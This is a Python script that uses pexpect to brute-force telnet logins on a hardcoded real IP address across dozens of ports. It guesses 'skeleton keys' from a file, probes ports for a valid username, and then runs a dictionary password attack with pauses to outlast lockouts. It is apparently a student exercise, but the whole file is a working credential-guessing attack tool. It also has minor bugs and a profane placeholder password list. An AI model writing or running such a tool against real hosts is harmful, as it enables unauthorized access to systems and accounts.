#!/usr/bin/python

from __future__ import print_function
import pexpect
import re
import os
import io
import sys
import time

ports = ['5028', '5071', '5103', '5123', '5264', '5292', '5338', '5357', '5461', '5541', '5743', '5769', '5784', '5878', '5882', '5897', '5966', '6033', '6034', '6051', '6192', '6291', '6308', '6367', '6428', '6448', '6489', '6585', '6610', '6616', '6652', '6762', '6842', '6942', '6978', '7011', '7029', '7041', '7068', '7138', '7328', '7510', '7694', '7765', '7819', '7829', '7919', '7984', '7992', '8009', '8147', '8152', '8212', '8229', '8248', '8314', '8392', '8441', '8487', '8500', '8511', '8648', '8659', '8665', '8751', '8757', '8763', '8831', '8849', '8914', '8933', '8961', '8966', '9011', '9105', '9111', '9152', '9274', '9392', '9526', '9589', '9631', '9714', '9779', '9890', '9936', '9999']

def setup_dir():
    if not os.path.exists(".tmp/"):
        os.mkdir(".tmp/")







def expect_not(child, line, f_out):
    try:
        index = child.expect([line,])
        if index == 0:
            print("FAIL")
            # f_out.write(u"FAIL\n")
            child.close()
    except pexpect.exceptions.EOF as e:
        # f_out.write(u"FAIL WITH EOF\n")
        print("FAIL WITH EOF")
        child.close()
        raise e
    except pexpect.exceptions.TIMEOUT:
        index = child.expect([re.compile(r"[a-zA-Z0-9]+"), pexpect.exceptions.EOF, pexpect.exceptions.TIMEOUT], timeout=0.1)
        if index == 0:
            # f_out.write(u"SUCCESS\n")
            print("SUCCESS")
            child.close()
            return True
        elif index == 1:
            # f_out.write(u"MATCH BUT FIL WITH EOF")
            child.close()
        elif index == 2:
            # f_out.write(u"MATCH BUT FIL WITH TIMEOUT")
            child.close()
        print("FAIL WITH TIMEOUT")
        child.close()
    return False


def mount_dictionary_attack(passwords, skeleton_key, username, port):

    for password in passwords:
        for i in [0,101,201,301,401,501,601,701,801,601]:

            # print(u"Testing password: " + username + " on port: " + str(port) + " STATUS:...")
            child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)


            child.sendline(skeleton_key)


            try:
                child.expect("Username: ", timeout=0.1)
            except pexpect.exceptions.EOF:
                print("EOF ON EXPECTING USERNAME")
                child.close()
            except pexpect.exceptions.TIMEOUT:
                print("TIMEOUT ON EXPECTING USERNAME")

            # if skeleton_key accepted, 
            #  send username to the Username:
            try:
                child.sendline(username)
            except pexpect.exceptions.EOF:
                print("EOF ON USERNAME")
                child.close()
            except pexpect.exceptions.TIMEOUT:
                print("TIMEOUT ON USERNAME")

            child.sendline(password)

            try:
                if expect_not(child,"Incorrect password, goodbye.", sys.stdout):
                    print("what....")
            except pexpect.exceptions.EOF:
                print("failed, couldnt attempt after sleeping " + str(i%600) + " second iteration " + str(i))
                time.sleep(600)








def find_designated_port(skeleton_key, username, ports, fast=True):
    print("starting find")
    f_out = io.open(".tmp/find_designated_port.out","w")
    for i in ports:
        f_out.write(u"Testing username: " + username + " on port: " + str(i) + " STATUS:...")
        child = pexpect.spawn("telnet 128.114.59.215 " + str(i), timeout=0.1)


        child.sendline(skeleton_key)
        # Try to send username after skeleton key
        # if port is broken or down, timeout is set to 5,
        # close child and move on
        try:
            child.expect("Username: ", timeout=0.1)
        except pexpect.exceptions.TIMEOUT:
            f_out.write(u"FAIL\n")
            child.close()
            continue


        # if skeleton_key accepted, 
        #  send username to the Username:
        child.sendline(username)

        if expect_not(child, "Invalid user, goodbye.", f_out) and fast:
            return i
        else:
            port = i

        
    return port


def find_skeleton(port, fast=True):
    print("starting skeleton")
    f_in = open("skeletonKeys.txt", "r")
    f_out = io.open(".tmp/find_skeleton.out","w")

    for line in f_in.readlines():
        f_out.write(u"Testing skeleton key: " + str(line).strip(' \t\r\n') + " STATUS:...")
        child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)

        child.sendline(str(str(line).strip(' \t\r\n')))

        if expect_not(child,"Connection",f_out) and fast:
            return str(line).strip(' \t\r\n')
        else:
            key = str(line).strip(' \t\r\n')

    f.close()
    return key


if __name__ == "__main__":

    setup_dir()

    # key = find_skeleton(ports[0])
    # my_port = find_designated_port(key, "dthurau", ports)

    password_dict = set(["what","the","fuck","how","does","this","work","fuck","a","duck"])

    mount_dictionary_attack(password_dict,'passepartout',"dthurau",str(5357))

